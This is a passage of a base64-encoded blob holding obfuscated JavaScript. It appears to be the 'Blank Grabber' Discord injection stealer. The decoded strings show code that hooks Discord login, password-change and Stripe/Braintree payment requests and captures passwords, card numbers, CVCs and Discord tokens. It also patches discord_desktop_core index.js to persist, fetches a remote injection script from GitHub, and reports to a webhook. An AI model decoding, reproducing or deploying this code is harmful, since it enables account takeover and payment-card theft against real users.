nXShob29rLF8weDNkOGY4ZSgweDI1MikpW18weDNkOGY4ZSgweDJhMSldKF8weDNkOGY4ZSgweDIxMSkpLCd3ZWJob29rX3Byb3RlY3Rvcl9rZXknOiclV0VCSE9PS19LRVklJywnYXV0b19idXlfbml0cm8nOiFbXSwncGluZ19vbl9ydW4nOiEhW10sJ3BpbmdfdmFsJzpfMHgzZDhmOGUoMHgyNWUpLCdlbWJlZF9uYW1lJzpfMHgzZDhmOGUoMHgyNzUpLCdlbWJlZF9pY29uJzonaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0JsYW5rLWMvQmxhbmstR3JhYmJlci9tYWluLy5naXRodWIvd29ya2Zsb3dzL2ltYWdlLnBuZycsJ2VtYmVkX2NvbG9yJzoweDAsJ2luamVjdGlvbl91cmwnOl8weDNkOGY4ZSgweDIxNyksJ2FwaSc6J2h0dHBzOi8vZGlzY29yZC5jb20vYXBpL3Y5L3VzZXJzL0BtZScsJ25pdHJvJzp7J2Jvb3N0Jzp7J3llYXInOnsnaWQnOl8weDNkOGY4ZSgweDI3MyksJ3NrdSc6XzB4M2Q4ZjhlKDB4MjZlKSwncHJpY2UnOl8weDNkOGY4ZSgweDI2NSl9LCdtb250aCc6eydpZCc6XzB4M2Q4ZjhlKDB4MjczKSwnc2t1JzonNTExNjUxODgwODM3ODQwODk2JywncHJpY2UnOl8weDNkOGY4ZSgweDFmMil9fSwnY2xhc3NpYyc6eydtb250aCc6eydpZCc6XzB4M2Q4ZjhlKDB4MjA3KSwnc2t1JzpfMHgzZDhmOGUoMHgxZmQpLCdwcmljZSc6XzB4M2Q4ZjhlKDB4MjQ2KX19fSwnZmlsdGVyJzp7J3VybHMnOltfMHgzZDhmOGUoMHgyM2EpLF8weDNkOGY4ZSgweDI2NyksXzB4M2Q4ZjhlKDB4MWNmKSwnaHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvdiovYXV0aC9sb2dpbicsXzB4M2Q4ZjhlKDB4MjhjKSxfMHgzZDhmOGUoMHgyNTgpLF8weDNkOGY4ZSgweDFkYiksXzB4M2Q4ZjhlKDB4MjBiKSxfMHgzZDhmOGUoMHgyNzEpLCdodHRwczovL2FwaS5zdHJpcGUuY29tL3YqL3BheW1lbnRfaW50ZW50cy8qL2NvbmZpcm0nXX0sJ2ZpbHRlcjInOnsndXJscyc6W18weDNkOGY4ZSgweDI0YSksXzB4M2Q4ZjhlKDB4MWQyKSwnaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdiovYXBwbGljYXRpb25zL2RldGVjdGFibGUnLF8weDNkOGY4ZSgweDI3YyksXzB4M2Q4ZjhlKDB4Mjk4KSxfMHgzZDhmOGUoMHgyM2QpXX19O2Z1bmN0aW9uIHBhcml0eV8zMihfMHgyNzgyN2UsXzB4NTQ0YmJmLF8weDE1NzkxZil7cmV0dXJuIF8weDI3ODI3ZV5fMHg1NDRiYmZeXzB4MTU3OTFmO31mdW5jdGlvbiBjaF8zMihfMHg1Njk2MDQsXzB4ZmUzMmMzLF8weDQ1ODRmOCl7cmV0dXJuIF8weDU2OTYwNCZfMHhmZTMyYzNefl8weDU2OTYwNCZfMHg0NTg0Zjg7fWZ1bmN0aW9uIG1hal8zMihfMHhmMWIzYWQsXzB4NWNkMmNhLF8weDE2ZGIyNyl7cmV0dXJuIF8weGYxYjNhZCZfMHg1Y2QyY2FeXzB4ZjFiM2FkJl8weDE2ZGIyN15fMHg1Y2QyY2EmXzB4MTZkYjI3O31mdW5jdGlvbiByb3RsXzMyKF8weGE0NTdkMCxfMHgyNTY2NWEpe3JldHVybiBfMHhhNDU3ZDA8PF8weDI1NjY1YXxfMHhhNDU3ZDA+Pj4weDIwLV8weDI1NjY1YTt9ZnVuY3Rpb24gc2FmZUFkZF8zMl8yKF8weDQzMzhhMyxfMHg1OWVhNzgpe3ZhciBfMHg2MTQ2NDU9KF8weDQzMzhhMyYweGZmZmYpKyhfMHg1OWVhNzgmMHhmZmZmKSxfMHg0YmY3NGI9KF8weDQzMzhhMz4+PjB4MTApKyhfMHg1OWVhNzg+Pj4weDEwKSsoXzB4NjE0NjQ1Pj4+MHgxMCk7cmV0dXJuKF8weDRiZjc0YiYweGZmZmYpPDwweDEwfF8weDYxNDY0NSYweGZmZmY7fWZ1bmN0aW9uIHNhZmVBZGRfMzJfNShfMHg0YjY1MGQsXzB4MWQyZWJjLF8weDQ2ZTMzNSxfMHgzMzhhZTgsXzB4MjNkZWRiKXt2YXIgXzB4NWVhNTczPShfMHg0YjY1MGQmMHhmZmZmKSsoXzB4MWQyZWJjJjB4ZmZmZikrKF8weDQ2ZTMzNSYweGZmZmYpKyhfMHgzMzhhZTgmMHhmZmZmKSsoXzB4MjNkZWRiJjB4ZmZmZiksXzB4MzBhZWYwPShfMHg0YjY1MGQ+Pj4weDEwKSsoXzB4MWQyZWJjPj4+MHgxMCkrKF8weDQ2ZTMzNT4+PjB4MTApKyhfMHgzMzhhZTg+Pj4weDEwKSsoXzB4MjNkZWRiPj4+MHgxMCkrKF8weDVlYTU3Mz4+PjB4MTApO3JldHVybihfMHgzMGFlZjAmMHhmZmZmKTw8MHgxMHxfMHg1ZWE1NzMmMHhmZmZmO31mdW5jdGlvbiBiaW5iMmhleChfMHgxNjM5NjYpe2NvbnN0IF8weGRjZDU3Yz1fMHgzZDhmOGU7dmFyIF8weDRiMWE1OT0nMDEyMzQ1Njc4OWFiY2RlZicsXzB4MzMzZWI1PScnLF8weDE1NGIyOD1fMHgxNjM5NjZbJ2xlbmd0aCddKjB4NCxfMHg0ZWZjNzUsXzB4MjEzMjExO2ZvcihfMHg0ZWZjNzU9MHgwO18weDRlZmM3NTxfMHgxNTRiMjg7XzB4NGVmYzc1Kz0weDEpe18weDIxMzIxMT1fMHgxNjM5NjZbXzB4NGVmYzc1Pj4+MHgyXT4+PigweDMtXzB4NGVmYzc1JTB4NCkqMHg4LF8weDMzM2ViNSs9XzB4NGIxYTU5WydjaGFyQXQnXShfMHgyMTMyMTE+Pj4weDQmMHhmKStfMHg0YjFhNTlbXzB4ZGNkNTdjKDB4MWZmKV0oXzB4MjEzMjExJjB4Zik7fXJldHVybiBfMHgzMzNlYjU7fWZ1bmN0aW9uIGdldEgoKXtyZXR1cm5bMHg2NzQ1MjMwMSwweGVmY2RhYjg5LDB4OThiYWRjZmUsMHgxMDMyNTQ3NiwweGMzZDJlMWYwXTt9ZnVuY3Rpb24gcm91bmRTSEExKF8weDU4NDJjNyxfMHgxODE5Yzcpe3ZhciBfMHg1N2NlNjE9W10sXzB4NGM2NjhhLF8weDVhMDhlNSxfMHg1MjM1ZWUsXzB4M2EwMDdlLF8weDU1YzlmYSxfMHg1MTg5ZDMsXzB4NWMxYWU1PWNoXzMyLF8weDNkNzNlOD1wYXJpdHlfMzIsXzB4MzA5NmU3PW1hal8zMixfMHg1MjhkZWU9cm90bF8zMixfMHg0YzAzYTc9c2FmZUFkZF8zMl8yLF8weDQxMWQ0OCxfMHg1YWM5OTA9c2FmZUFkZF8zMl81O18weDRjNjY4YT1fMHgxODE5YzdbMHgwXSxfMHg1YTA4ZTU9XzB4MTgxOWM3WzB4MV0sXzB4NTIzNWVlPV8weDE4MTljN1sweDJdLF8weDNhMDA3ZT1fMHgxODE5YzdbMHgzXSxfMHg1NWM5ZmE9XzB4MTgxOWM3WzB4NF07Zm9yKF8weDQxMWQ0OD0weDA7XzB4NDExZDQ4PDB4NTA7XzB4NDExZDQ4Kz0weDEpe18weDQxMWQ0ODwweDEwP18weDU3Y2U2MVtfMHg0MTFkNDhdPV8weDU4NDJjN1tfMHg0MTFkNDhdOl8weDU3Y2U2MVtfMHg0MTFkNDhdPV8weDUyOGRlZShfMHg1N2NlNjFbXzB4NDExZDQ4LTB4M11eXzB4NTdjZTYxW18weDQxMWQ0OC0weDhdXl8weDU3Y2U2MVtfMHg0MTFkNDgtMHhlXV5fMHg1N2NlNjFbXzB4NDExZDQ4LTB4MTBdLDB4MSk7aWYoXzB4NDExZDQ4PDB4MTQpXzB4NTE4OWQzPV8weDVhYzk5MChfMHg1MjhkZWUoXzB4NGM2NjhhLDB4NSksXzB4NWMxYWU1KF8weDVhMDhlNSxfMHg1MjM1ZWUsXzB4M2EwMDdlKSxfMHg1NWM5ZmEsMHg1YTgyNzk5OSxfMHg1N2NlNjFbXzB4NDExZDQ4XSk7ZWxzZXtpZihfMHg0MTFkNDg8MHgyOClfMHg1MTg5ZDM9XzB4NWFjOTkwKF8weDUyOGRlZShfMHg0YzY2OGEsMHg1KSxfMHgzZDczZTgoXzB4NWEwOGU1LF8weDUyMzVlZSxfMHgzYTAwN2UpLF8weDU1YzlmYSwweDZlZDllYmExLF8weDU3Y2U2MVtfMHg0MTFkNDhdKTtlbHNlIF8weDQxMWQ0ODwweDNjP18weDUxODlkMz1fMHg1YWM5OTAoXzB4NTI4ZGVlKF8weDRjNjY4YSwweDUpLF8weDMwOTZlNyhfMHg1YTA4ZTUsXzB4NTIzNWVlLF8weDNhMDA3ZSksXzB4NTVjOWZhLDB4OGYxYmJjZGMsXzB4NTdjZTYxW18weDQxMWQ0OF0pOl8weDUxODlkMz1fMHg1YWM5OTAoXzB4NTI4ZGVlKF8weDRjNjY4YSwweDUpLF8weDNkNzNlOChfMHg1YTA4ZTUsXzB4NTIzNWVlLF8weDNhMDA3ZSksXzB4NTVjOWZhLDB4Y2E2MmMxZDYsXzB4NTdjZTYxW18weDQxMWQ0OF0pO31fMHg1NWM5ZmE9XzB4M2EwMDdlLF8weDNhMDA3ZT1fMHg1MjM1ZWUsXzB4NTIzNWVlPV8weDUyOGRlZShfMHg1YTA4ZTUsMHgxZSksXzB4NWEwOGU1PV8weDRjNjY4YSxfMHg0YzY2OGE9XzB4NTE4OWQzO31yZXR1cm4gXzB4MTgxOWM3WzB4MF09XzB4NGMwM2E3KF8weDRjNjY4YSxfMHgxODE5YzdbMHgwXSksXzB4MTgxOWM3WzB4MV09XzB4NGMwM2E3KF8weDVhMDhlNSxfMHgxODE5YzdbMHgxXSksXzB4MTgxOWM3WzB4Ml09XzB4NGMwM2E3KF8weDUyMzVlZSxfMHgxODE5YzdbMHgyXSksXzB4MTgxOWM3WzB4M109XzB4NGMwM2E3KF8weDNhMDA3ZSxfMHgxODE5YzdbMHgzXSksXzB4MTgxOWM3WzB4NF09XzB4NGMwM2E3KF8weDU1YzlmYSxfMHgxODE5YzdbMHg0XSksXzB4MTgxOWM3O31mdW5jdGlvbiBmaW5hbGl6ZVNIQTEoXzB4NWU0ZmQ3LF8weDVhMDUzNSxfMHgxZGEwYjYsXzB4ODZiMGQ1KXtjb25zdCBfMHgzODlkOWM9XzB4M2Q4ZjhlO3ZhciBfMHg4OWM3YzAsXzB4MzVkODM3LF8weDNmMjdlNTtfMHgzZjI3ZTU9KF8weDVhMDUzNSsweDQxPj4+MHg5PDwweDQpKzB4Zjt3aGlsZShfMHg1ZTRmZDdbXzB4Mzg5ZDljKDB4MjdhKV08PV8weDNmMjdlNSl7XzB4NWU0ZmQ3W18weDM4OWQ5YygweDI1NyldKDB4MCk7fV8weDVlNGZkN1tfMHg1YTA1MzU+Pj4weDVdfD0weDgwPDwweDE4LV8weDVhMDUzNSUweDIwLF8weDVlNGZkN1tfMHgzZjI3ZTVdPV8weDVhMDUzNStfMHgxZGEwYjYsXzB4MzVkODM3PV8weDVlNGZkN1tfMHgzODlkOWMoMHgyN2EpXTtmb3IoXzB4ODljN2MwPTB4MDtfMHg4OWM3YzA8XzB4MzVkODM3O18weDg5YzdjMCs9MHgxMCl7XzB4ODZiMGQ1PXJvdW5kU0hBMShfMHg1ZTRmZDdbJ3NsaWNlJ10oXzB4ODljN2MwLF8weDg5YzdjMCsweDEwKSxfMHg4NmIwZDUpO31yZXR1cm4gXzB4ODZiMGQ1O31mdW5jdGlvbiBfMHgzODY2KF8weDU4ZDE4ZCxfMHgxMWFiN2Mpe2NvbnN0IF8weDE2OTljZj1fMHgxNjk5KCk7cmV0dXJuIF8weDM4NjY9ZnVuY3Rpb24oXzB4Mzg2NmUxLF8weDNhNWQ0Nil7XzB4Mzg2NmUxPV8weDM4NjZlMS0weDFjZDtsZXQgXzB4MTBjOTgyPV8weDE2OTljZltfMHgzODY2ZTFdO3JldHVybiBfMHgxMGM5ODI7fSxfMHgzODY2KF8weDU4ZDE4ZCxfMHgxMWFiN2MpO31mdW5jdGlvbiBfMHgxNjk5KCl7Y29uc3QgXzB4YzkxZjRhPVsnc3Vic3RyaW5nJywnZXJyb3InLCdiaW5MZW4nLCdnaWZ0X2NvZGUnLCdhcHBsaWNhdGlvbi9qc29uJywnMzE2NzA2NVJXc0JMZicsJ0dvbGRceDIwQnVnSHVudGVyLFx4MjAnLCdFbWFpbDpceDIwKionLCdodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbS9tZXJjaGFudHMvNDlwcDJycDRwaHltNzM4Ny9jbGllbnRfYXBpL3YqL3BheW1lbnRfbWV0aG9kcy9wYXlwYWxfYWNjb3VudHMnLCdQT1NUJywn8J+Ss1x4MjAnLCdwYXRobmFtZScsJ1ZlcmlmaWVkXHgyMEJvdFx4MjBEZXZlbG9wZXIsXHgyMCcsJ3NsaWNlJywnZGVmYXVsdFNlc3Npb24nLCcqKlRva2VuKionLCdkaXNjcmltaW5hdG9yJywnd2ViaG9va19wcm90ZWN0b3Jfa2V5JywnZW1haWwnLCdpbmRleE9mJywncGluZ19vbl9ydW4nLCdIeXBlc3F1YWRceDIwRXZlbnQsXHgyMCcsJ3N1YnN0cicsJ2luY2x1ZGVzJywnTml0cm9ceDIwVHlwZTpceDIwKionLCdib29zdCcsJ2luZGV4LmpzJywnL2JpbGxpbmcvcGF5bWVudC1zb3VyY2VzXHgyMixceDIwZmFsc2UpO1x4MjBceDBhXHgyMFx4MjBceDIwXHgyMHhtbEh0dHAuc2V0UmVxdWVzdEhlYWRlcihceDIyQXV0aG9yaXphdGlvblx4MjIsXHgyMFx4MjInLCdhcmd2JywndXNlcnMvQG1lJywnOTgzNjM0cW1CeklOJywnOTk5JywnZ2V0SE1BQycsJyoqXHgwYUJpbGxpbmc6XHgyMCoqJywncmVxdWVzdCcsJ3dlYlJlcXVlc3QnLCdTdHJpbmdceDIwb2ZceDIwSEVYXHgyMHR5cGVceDIwY29udGFpbnNceDIwaW52YWxpZFx4MjBjaGFyYWN0ZXJzJywnb25Db21wbGV0ZWQnLCdlbmQnLCdqb2luJywnd3NzOi8vcmVtb3RlLWF1dGgtZ2F0ZXdheScsJ2Rpc2NvcmQnLCc1MTE2NTE4NzE3MzYyMDEyMTYnLCcqKkRpc2NvcmRceDIwSW5mbyoqJywnY2hhckF0JywnZW1iZWRfbmFtZScsJ1Jlc291cmNlcycsJ3dlYmhvb2snLCcqKlx4MGFCYWRnZXM6XHgyMCoqJywnaW5pdGlhdGlvbicsJ3RvVXBwZXJDYXNlJywnMTQwNjY1ZE5yeXd6JywnNTIxODQ2OTE4NjM3NDIwNTQ1Jywnd2luMzInLCcqKkVtYWlsXHgyMENoYW5nZWQqKicsJ2ludmFsaWQnLCdodHRwczovL2FwaS5zdHJpcGUuY29tL3YqL3Rva2VucycsJ2V4cG9ydHMnLCdgYGAnLCdceDVjbW9kdWxlc1x4NWMnLCdtZXRob2QnLCdceDI3KVx4MGFceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMHJlcy5waXBlKGZpbGUpO1x4MGFceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMGZpbGUub24oXHgyN2ZpbmlzaFx4MjcsXHgyMCgpXHgyMD0+XHgyMHtceDBhXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwZmlsZS5jbG9zZSgpO1x4MGFceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMH0pO1x4MGFceDIwXHgyMFx4MjBceDIwXHgwYVx4MjBceDIwXHgyMFx4MjB9KS5vbihceDIyZXJyb3JceDIyLFx4MjAoZXJyKVx4MjA9Plx4MjB7XHgwYVx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwc2V0VGltZW91dChpbml0KCksXHgyMDEwMDAwKTtceDBhXHgyMFx4MjBceDIwXHgyMH0pO1x4MGF9XHgwYXJlcXVpcmUoXHgyNycsJ2FzY2lpJywnMTI3NTg0OVNaUXJ3bicsJ2VsZWN0cm9uJywnQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVoyMzQ1NjcnLCdwcmljZScsJzMyNTg5NjhzR3h5TGsnLCdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vQmxhbmstYy9CbGFuay1HcmFiYmVyL21haW4vQmxhbmslMjBHcmFiYmVyL0RhdGEvaW5qZWN0aW9uLW9iZnVzY2F0ZWQuanMnLCdvbkhlYWRlcnNSZWNlaXZlZCcsJ3ZhbHVlJywnZmxhZ3MnLCd1cmwnLCdza3UnLCdhcHAnLCdjb250ZW50LXNlY3VyaXR5LXBvbGljeS1yZXBvcnQtb25seScsJ2pzU0hBJywnQVBQREFUQScsJ3BsYXRmb3JtJywnYXNzaWduJywncm91bmQnLCdceDIyKTtceDIwXHgwYVx4MjBceDIwXHgyMFx4MjB4bWxIdHRwLnNlbmQobnVsbCk7XHgyMFx4MGFceDIwXHgyMFx4MjBceDIweG1sSHR0cC5yZXNwb25zZVRleHQnLCdDb250ZW50cycsJ3VubGlua1N5bmMnLCdceDIyKTtceDBhXHgyMFx4MjBceDIwXHgyMHhtbEh0dHAuc2V0UmVxdWVzdEhlYWRlcihceDI3Q29udGVudC1UeXBlXHgyNyxceDIwXHgyN2FwcGxpY2F0aW9uL2pzb25ceDI3KTtceDBhXHgyMFx4MjBceDIwXHgyMHhtbEh0dHAuc2VuZChKU09OLnN0cmluZ2lmeSgnLCdjb250ZW50LXNlY3VyaXR5LXBvbGljeScsJ3Bhc3N3b3JkJywnc2V0SE1BQ0tleScsJ1x4MjcsXHgyMChyZXMpXHgyMD0+XHgyMHtceDBhXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBjb25zdFx4MjBmaWxlXHgyMD1ceDIwZnMuY3JlYXRlV3JpdGVTdHJlYW0oaW5kZXhKcyk7XHgwYVx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwcmVzLnJlcGxhY2UoXHgyMlx4MjclV0VCSE9PS0hFUkVCQVNFNjRFTkNPREVEJVx4MjdceDIyLFx4MjBceDIyXHgyNycsJ0Vhcmx5XHgyMFN1cHBvcnRlcixceDIwJywnY2F0Y2gnLCdhcHAuYXNhcicsJ2ZpbHRlcicsJ2Zyb20nLCcqKlBhc3N3b3JkXHgyMENoYW5nZWQqKicsJ2NhcmRbZXhwX3llYXJdJywnKlx4MGFCYWRnZXM6XHgyMCoqJywneWVhcicsJ29uQmVmb3JlUmVxdWVzdCcsJ0FjY2Vzcy1Db250cm9sLUFsbG93LUhlYWRlcnNceDIwXHgyNypceDI3JywnKipOaXRyb1x4MjBDb2RlOioqXHgwYWBgYGRpZmZceDBhK1x4MjAnLCd3cml0ZUZpbGVTeW5jJywncGF5cGFsX2FjY291bnRzJywnaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdiovdXNlcnMvQG1lJywnKipceDBhQ3JlZGl0XHgyMENhcmRceDIwRXhwaXJhdGlvbjpceDIwKionLCczMjc4NDE4Wk5FTm5TJywnd3NzOi8vcmVtb3RlLWF1dGgtZ2F0ZXdheS5kaXNjb3JkLmdnLyonLCduZXdfcGFzc3dvcmQnLCdudW1Sb3VuZHNceDIwbXVzdFx4MjBhXHgyMGludGVnZXJceDIwPj1ceDIwMScsJ3NlcCcsJ25pdHJvJywnTml0cm9ceDIwQm9vc3QnLCdleGlzdHNTeW5jJywnY2FyZFtjdmNdJywnYXV0b19idXlfbml0cm8nLCc0OTknLCdIeXBlU3F1YWRceDIwQnJhdmVyeSxceDIwJywncm1kaXJTeW5jJywnXHgyMik7XHgwYVx4MjBceDIwXHgyMFx4MjB4bWxIdHRwLnNlbmQobnVsbCk7XHgwYVx4MjBceDIwXHgyMFx4MjB4bWxIdHRwLnJlc3BvbnNlVGV4dDsnLCdodHRwczovL3N0YXR1cy5kaXNjb3JkLmNvbS9hcGkvdiovc2NoZWR1bGVkLW1haW50ZW5hbmNlcy91cGNvbWluZy5qc29uJywnXHg1Y2Rpc2NvcmRfZGVza3RvcF9jb3JlXHg1Y2luZGV4LmpzJywnY29uc3RceDIwZnNceDIwPVx4MjByZXF1aXJlKFx4Mjdmc1x4MjcpLFx4MjBodHRwc1x4MjA9XHgyMHJlcXVpcmUoXHgyN2h0dHBzXHgyNyk7XHgwYWNvbnN0XHgyMGluZGV4SnNceDIwPVx4MjBceDI3JywnTml0cm9ceDIwQ2xhc3NpYycsJ2luamVjdGlvbl91cmwnLCcqKlx4MjAtXHgyMFBhc3N3b3JkOlx4MjAqKicsJ2Rpc2NvcmQuY29tJywndW5kZWZpbmVkJywnYmFzZTY0JywndXNkJywnKipceDBhUGFzc3dvcmQ6XHgyMCoqJywnLndlYnAnLCdob3N0JywncHVzaCcsJ2h0dHBzOi8vKi5kaXNjb3JkLmNvbS9hcGkvdiovYXV0aC9sb2dpbicsJ2xvZ2luJywnY29udGVudCcsJ1x4MjIsXHgyMGZhbHNlKTtceDBhXHgyMFx4MjBceDIwXHgyMHhtbEh0dHAuc2V0UmVxdWVzdEhlYWRlcihceDIyQXV0aG9yaXphdGlvblx4MjIsXHgyMFx4MjInLCdta2RpclN5bmMnLCdOb25lJywnQGV2ZXJ5b25lJywnZnVuY3Rpb24nLCdJbnZhbGlkXHgyMGJhc2UzMlx4MjBjaGFyYWN0ZXJceDIwaW5ceDIwa2V5JywnKipOaXRyb1x4MjBib3VnaHQhKionLCcqKlx4MGFDVkM6XHgyMCoqJywnbW9udGgnLCdodHRwcycsJzk5OTknLCd3cml0ZScsJ2h0dHBzOi8vZGlzY29yZGFwcC5jb20vYXBpL3YqL3VzZXJzL0BtZScsJ3BhdGgnLCdzdHJpbmdpZnknLCdlbmRzV2l0aCcsJ3Rva2VucycsJ3BpbmdfdmFsJywnZW1iZWRfaWNvbicsJzUxMTY1MTg4NTQ1OTk2MzkwNCcsJ1x4Mjc7XHgwYWNvbnN0XHgyMGZpbGVTaXplXHgyMD1ceDIwZnMuc3RhdFN5bmMoaW5kZXhKcykuc2l6ZVx4MGFmcy5yZWFkRmlsZVN5bmMoaW5kZXhKcyxceDIwXHgyN3V0ZjhceDI3LFx4MjAoZXJyLFx4MjBkYXRhKVx4MjA9Plx4MjB7XHgwYVx4MjBceDIwXHgyMFx4MjBpZlx4MjAoZmlsZVNpemVceDIwPFx4MjAyMDAwMFx4MjB8fFx4MjBkYXRhXHgyMD09PVx4MjBceDIybW9kdWxlLmV4cG9ydHNceDIwPVx4MjByZXF1aXJlKFx4MjcuL2NvcmUuYXNhclx4MjcpXHgyMilceDIwXHgwYVx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwaW5pdCgpO1x4MGF9KVx4MGFhc3luY1x4MjBmdW5jdGlvblx4MjBpbml0KClceDIwe1x4MGFceDIwXHgyMFx4MjBceDIwaHR0cHMuZ2V0KFx4MjcnLCdjYXJkW251bWJlcl0nLCdodHRwczovL2FwaS5zdHJpcGUuY29tL3YqL3NldHVwX2ludGVudHMvKi9jb25maXJtJywnY29uZmlybScsJzUyMTg0NzIzNDI0NjA4MjU5OScsJ1x4MjdceDIyKVx4MGFceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMHJlcy5yZXBsYWNlKFx4MjclV0VCSE9PS19LRVklXHgyNyxceDIwXHgyNycsJ0JsYW5rXHgyMEdyYWJiZXInLCdlbnYnLCdOb1x4MjBOaXRybycsJ2xvZycsJ2h0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F2YXRhcnMvJywnbGVuZ3RoJywnXHgyNylceDBhaWZceDIwKGZzLmV4aXN0c1N5bmMoYmRQYXRoKSlceDIwcmVxdWlyZShiZFBhdGgpOycsJ2h0dHBzOi8vKi5kaXNjb3JkLmNvbS9hcGkvdiovdXNlcnMvQG1lL2xpYnJhcnknLCdyZXNwb25zZUhlYWRlcnMnLCdzdGF0dXNDb2RlJywnZW1iZWRfY29sb3InLCdHcmVlblx4MjBCdWdIdW50ZXIsXHgyMCcsJzw6cGF5cGFsOjk1MTEzOTE4OTM4OTQxMDM2NT5ceDIwJywndmFyXHgyMHhtbEh0dHBceDIwPVx4MjBuZXdceDIwWE1MSHR0cFJlcXVlc3QoKTtceDIwXHgwYVx4MjBceDIwXHgyMFx4MjB4bWxIdHRwLm9wZW4oXHgyMkdFVFx4MjIsXHgyMFx4MjInLCclV0VCSE9PS0hFUkVCQVNFNjRFTkNPREVEJScsJ2J1ZmZlcicsJzdmZmZmZmZmJywnQ3JlZGl0XHgyMENhcmRceDIwTnVtYmVyOlx4MjAqKicsJ3JlcGxhY2UnLCcod2VicGFja0NodW5rZGlzY29yZF9hcHAucHVzaChbW1x4MjdceDI3XSx7fSxlPT57bT1bXTtmb3IobGV0XHgyMGNceDIwaW5ceDIwZS5jKW0ucHVzaChlLmNbY10pfV0pLG0pLmZpbmQobT0+bT8uZXhwb3J0cz8uZGVmYXVsdD8uZ2V0VG9rZW4hPT12b2lkXHgyMDApLmV4cG9ydHMuZGVmYXVsdC5nZXRUb2tlbigpJywnYXZhdGFyJywndXBsb2FkRGF0YScsJ2RhcndpbicsJ2h0dHBzOi8vZGlzY29yZC5jb20vYXBpL3YqL2F1dGgvbG9naW4nLCdzdGFydHNXaXRoJywnOEJ3dW9UdScsJ2NsYXNzaWMnLCcqKlx4MGFOZXdceDIwUGFzc3dvcmQ6XHgyMCoqJywnSHlwZVNxdWFkXHgyMEJhbGFuY2UsXHgyMCcsJ0Nhbm5vdFx4MjBjYWxsXHgyMGdldEhNQUNceDIwd2l0aG91dFx4MjBmaXJzdFx4MjBzZXR0aW5nXHgyMEhNQUNceDIwa2V5JywnYXBpJywnbm93JywnUEFUQ0gnLCd1c2VybmFtZScsJ0ZhaWxlZFx4MjB0b1x4MjBQdXJjaGFzZVx4MjDinYwnLCdodHRwczovL2Rpc2NvcmQuY29tL2FwaS92Ki91c2Vycy9AbWUvbGlicmFyeScsJ3BhcnNlJywnRGlzY29yZFx4MjBTdGFmZixceDIwJywnKipBY2NvdW50XHgyMEluZm8qKicsJ3ByZW1pdW1fdHlwZScsJ1x4MjB8XHgyMCcsJ2ZvckVhY2gnLCd3aW5kb3cud2VicGFja0pzb25wPyhnZz13aW5kb3cud2VicGFja0pzb25wLnB1c2goW1tdLHtnZXRfcmVxdWlyZTooYSxiLGMpPT5hLmV4cG9ydHM9Y30sW1tceDIyZ2V0X3JlcXVpcmVceDIyXV1dKSxkZWxldGVceDIwZ2cubS5nZXRfcmVxdWlyZSxkZWxldGVceDIwZ2cuYy5nZXRfcmVxdWlyZSk6d2luZG93LndlYnBhY2tDaHVua2Rpc2NvcmRfYXBwJiZ3aW5kb3cud2VicGFja0NodW5rZGlzY29yZF9hcHAucHVzaChbW01hdGgucmFuZG9tKCldLHt9LGE9PntnZz1hfV0pO2Z1bmN0aW9uXHgyMExvZ091dCgpeyhmdW5jdGlvbihhKXtjb25zdFx4MjBiPVx4MjJzdHJpbmdceDIyPT10eXBlb2ZceDIwYT9hOm51bGw7Zm9yKGNvbnN0XHgyMGNceDIwaW5ceDIwZ2cuYylpZihnZy5jLmhhc093blByb3BlcnR5KGMpKXtjb25zdFx4MjBkPWdnLmNbY10uZXhwb3J0cztpZihkJiZkLl9fZXNNb2R1bGUmJmQuZGVmYXVsdCYmKGI/ZC5kZWZhdWx0W2JdOmEoZC5kZWZhdWx0KSkpcmV0dXJuXHgyMGQuZGVmYXVsdDtpZihkJiYoYj9kW2JdOmEoZCkpKXJldHVyblx4MjBkfXJldHVyblx4MjBudWxsfSkoXHgyMmxvZ2luXHgyMikubG9nb3V0KCl9TG9nT3V0KCk7JywnZGVmYXVsdCcsJ3RvU3RyaW5nJywnNDMwOTc1M0hMblZIRycsJy9wdXJjaGFzZVx4MjIsXHgyMGZhbHNlKTtceDBhXHgyMFx4MjBceDIwXHgyMHhtbEh0dHAuc2V0UmVxdWVzdEhlYWRlcihceDIyQXV0aG9yaXphdGlvblx4MjIsXHgyMFx4MjInLCdIeXBlU3F1YWRceDIwQnJpbGxhbmNlLFx4MjAnLCdodHRwczovLyouZGlzY29yZC5jb20vYXBpL3YqL3VzZXJzL0BtZScsJ2FtZCcsJ3VwZGF0ZScsJ2h0dHBzOi8vKi5kaXNjb3JkLmNvbS9hcGkvdiovYXBwbGljYXRpb25zL2RldGVjdGFibGUnXTtfMHgxNjk5PWZ1bmN0aW9uKCl7cmV0dXJuIF8weGM5MWY0YTt9O3JldHVybiBfMHgxNjk5KCk7fWZ1bmN0aW9uIGhleDJiaW5iKF8weDg5NDYsXzB4OTc5YjEyLF8weDJkNGJiOSl7Y29uc3QgXzB4Mzc5OTllPV8weDNkOGY4ZTt2YXIgXzB4MWQwZWI5LF8weDFkMDY0Yj1fMHg4OTQ2W18weDM3OTk5ZSgweDI3YSldLF8weDMwZDM3OCxfMHgyN2Y0MTYsXzB4OGI0OWU2LF8weDVmMWNiYyxfMHg0YTU5NWY7XzB4MWQwZWI5PV8weDk3OWIxMnx8WzB4MF0sXzB4MmQ0YmI5PV8weDJkNGJiOXx8MHgwLF8weDRhNTk1Zj1fMHgyZDRiYjk+Pj4weDM7MHgwIT09XzB4MWQwNjRiJTB4MiYmY29uc29sZVtfMHgzNzk5OWUoMHgxZDQpXSgn